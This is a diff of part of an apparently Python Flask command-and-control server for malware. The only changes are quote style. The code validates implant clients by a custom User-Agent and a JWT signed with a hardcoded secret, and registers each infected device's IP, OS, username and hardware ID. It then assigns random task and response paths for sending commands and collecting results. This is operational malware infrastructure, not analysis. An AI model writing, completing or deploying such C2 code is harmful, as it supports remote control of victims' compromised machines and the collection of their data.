@@ -212,9 +212,9 @@ def overviewPage():
 #C2 interface
 def validateC2Client(request:flask.request) -> bool:
     try:
-        if request.headers['User-Agent'].split()[0] != "NClient": return False
+        if request.headers['User-Agent'].split()[0] != 'NClient': return False
         cToken = request.headers['NClient-Token']
-        cToken = jwt.decode(cToken, "Noire", algorithms=["HS256"])
+        cToken = jwt.decode(cToken, 'Noire', algorithms=['HS256'])
         #if cToken['ip'] != request.remote_addr: return False #Blocks Proxies, VPN's and LAN devices
         cToken['os']
         cToken['user']
@@ -231,15 +231,15 @@ def validateC2Client(request:flask.request) -> bool:
 def generateRandPath() -> str:
     x = ""
     for y in range(12):
-        x += secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+        x += secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
     return x
 
 @app.route('/contact')
 def contactC2Page():
-    if not validateC2Client(flask.request): return not_found("Invalid")
+    if not validateC2Client(flask.request): return not_found('Invalid')
     jwT = flask.request.headers['NClient-Token']
     if not Device.query.get(jwT):
-        token = jwt.decode(jwT, "Noire", algorithms=["HS256"])
+        token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                            hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
